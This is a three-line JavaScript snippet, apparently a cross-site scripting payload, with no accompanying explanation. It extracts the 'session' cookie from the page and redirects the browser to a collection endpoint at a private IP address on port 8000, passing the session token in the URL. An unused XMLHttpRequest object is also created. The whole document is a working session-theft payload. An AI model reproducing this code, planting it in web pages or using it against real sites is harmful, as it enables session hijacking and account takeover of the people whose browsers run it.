var xhr = new XMLHttpRequest();
var token = document.cookie.split(';').find(cookie => cookie.trim().startsWith('session=')).split('=')[1];
window.location.href ='http://192.168.0.102:8000/capture?token='+encodeURIComponent(token);
